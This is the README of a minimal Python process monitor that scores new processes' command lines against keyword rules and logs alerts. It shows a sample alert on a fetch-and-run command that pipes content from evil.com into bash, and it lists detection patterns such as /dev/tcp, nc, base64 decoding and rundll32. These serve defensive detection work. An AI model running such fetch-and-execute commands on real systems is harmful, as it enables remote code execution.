# Minimal EDR-like Process Monitor

Version: v1.0 (Initial Release)

This is the first stable iteration of the monitor. It discovers newly spawned processes, applies lightweight pattern-based rules, writes structured logs, and prints high-severity alerts to the console. Future versions will expand capabilities while keeping noise low and performance reasonable.

**Current behavior (v1.0):**
- All detections → `logs/alerts.jsonl` (with severity and risk score)
- `HIGH`/`CRITICAL` → printed to console with color
- `LOW`/`MEDIUM` → logged silently
- Process logging → **disabled by default** (enable with `--log-all`)

## Features

- **Platform-aware detection**: Different suspicious patterns for Windows vs Unix/Linux/macOS
- **Risk scoring system**: Each pattern has a risk score (20-100)
- **Severity levels**: CRITICAL (≥100), HIGH (≥70), MEDIUM (≥40), LOW (<40)
- **Smart categorization**: 
  - Score ≥70 → HIGH/CRITICAL (printed + logged)
  - Score <70 → LOW/MEDIUM (logged silently)
- **Interactive review tool**: CLI tool to review and classify suspicious activities
- **Whitelist support**: Mark safe processes to reduce false positives
 - **Timezone-aware timestamps**: UTC ISO8601 with `Z` suffix
 - **Burst scanning**: Catch short-lived processes via `--burst`

## Quick Demo

**Quickest test method** (optional dev tool):
```bash
./dev/demo.sh
```

Interactive menu with:
- ✅ Simulation test (no psutil required)
- 🔍 Review tool demo
- 📊 Real system monitoring (30 seconds)
- 📈 Statistics

## Setup
```bash
python3 -m pip install -r requirements.txt
```

**or with virtualenv:**
```bash
python3 -m venv .venv
source .venv/bin/activate  # Windows: .venv\Scripts\activate
pip install -r requirements.txt
```

## Run Monitor
```bash
python3 main.py
```

Run options:
```bash
# Base interval (seconds), default 1
python3 main.py --interval 1

# Burst scanning N times per interval with sleep between bursts
python3 main.py --burst 10 --burst-sleep 0.05

# Enable logging of all processes (default: off, only alerts are logged)
python3 main.py --log-all
```

## Review Tool (Optional)

*Note: v1.0 logs all detections to `alerts.jsonl` by default. The review tool is available for manual workflows.*

```bash
# Review pending records
python3 review_tool.py

# Show statistics
python3 review_tool.py --stats

# Show all records
python3 review_tool.py --all
```

## Example Output

### High Severity (printed to console)
```
🚨 [DETECTION - CRITICAL]
   PID: 1234 | Score: 110
   Matches: ['base64 -d(80)', 'bash -c(60)', 'curl(10)']
   Command: bash -c curl http://evil.com | base64 -d | bash
```

### Low/Medium Severity (logged silently)
```
# Not printed to console; written to logs/alerts.jsonl only
{"severity":"MEDIUM","risk_score":50,"matches":["curl(10)"],"pid":5678,...}
```

## Risk Scores

**High Risk (80-100)**
- Encoded commands (`-enc`, `-encodedcommand`)
- Direct TCP connections (`/dev/tcp`)
- Base64 decoding (`base64 -d`)
- DLL execution (`rundll32`, `mshta`, `regsvr32`)

**Medium Risk (50-79)**
- Shell interpreters with inline commands (`bash -c`, `powershell`)
- Network tools (`wget`, `curl`, `nc`)
- Script interpreters with inline code (`python -c`, `perl -e`)

**Low Risk (20-49)**
- Command chaining (`&&`, `||`, `|`)
- URL patterns (`http://`, `https://`)

## File Structure

```
logs/
├── process_log.jsonl       # All new processes (optional, requires --log-all)
├── alerts.jsonl            # High threat (score ≥70)
├── review_queue.jsonl      # Requires review (score 30-69) — optional workflow
└── whitelist.jsonl         # Marked as safe (optional)

JSONL schemas:
- `process_log.jsonl`: `{timestamp, pid, name, exe, cmdline, create_time, username}` (only created with --log-all)
- `alerts.jsonl`: `{timestamp, pid, name, cmdline, matches, risk_score, severity}`
```

## Notes
- Only NEW PIDs are logged (tracker kept in-memory).
- Handles `psutil.NoSuchProcess` and `psutil.AccessDenied` gracefully.
- Suspicious keywords are defined in `rules.py`.
- Platform detection is automatic via `platform.system()`.
- Review decisions are persistent and can be audited.
 - Short, common enumeration commands (e.g., `whoami`, `uname -a`, `id`) are intentionally not flagged to reduce noise; extremely short-lived processes may be missed unless burst scanning is enabled or commands are delayed (e.g., `bash -c 'sleep 2; whoami'`).
 - Only `HIGH`/`CRITICAL` alerts print to console; `LOW`/`MEDIUM` are written to `alerts.jsonl`.
 - Dev/demo helpers are archived under `dev/`. You may remove them entirely.

## Roadmap (Planned for v1.x+)

- **Parent/child process lineage**: Track process ancestry and spawning chains.
- **Persistent baselines**: Save seen PIDs and whitelists across restarts.
- **Extended detection rules**: File writes to sensitive paths, outbound network connections, privilege escalation.
- **Configuration file support**: YAML/JSON config for rules, thresholds, log paths.
- **Packaging**: Install via `pipx` or standalone binary; systemd/launchd service templates.
- **Integrations**: Webhook alerts, syslog forwarding, SIEM-friendly JSON output.

## Testing / Generating Alerts (Safe examples)

Below are safe, non-harmful example commands you can run locally to generate alert entries while the monitor is running. These commands *do not* download or execute untrusted code — they only include suspicious keywords (echoed) so the monitor's pattern-matching triggers.

Linux / macOS (bash/zsh):
```zsh
# Produces a process whose cmdline contains 'curl' (no network call)
bash -c "sleep 2; echo 'curl http://example.com'"

# Includes a 'base64' token and a pipe '|' in the command string
bash -c "sleep 2; echo 'hello' | sed 's/hello/ok/'"

# Shows an inline interpreter token (python -c) but only echoes the string
bash -c "sleep 2; echo 'python -c \"print(1)\"'"
```

Windows (PowerShell) — run from an Administrator/regular PowerShell prompt:
```powershell
# Safe: prints an Invoke-Expression-like token, does not execute it
powershell -Command "Start-Sleep -Seconds 2; Write-Output 'Invoke-Expression'"

# Safe encoded-like token (no execution)
powershell -Command "Start-Sleep -Seconds 2; Write-Output 'EncodedCommand'"
```

Notes:
- These examples use `sleep`/`Start-Sleep` so the process exists long enough to be observed. Without a delay the monitor may miss very short-lived commands.
- For higher detection reliability, run the monitor with `--burst N --burst-sleep 0.05` (e.g., `--burst 10`).
- The strings shown (e.g., `curl`, `base64`, `python -c`, `Invoke-Expression`) are matched by `rules.py` and will produce entries in `logs/alerts.jsonl` with an associated `risk_score` and `severity`.

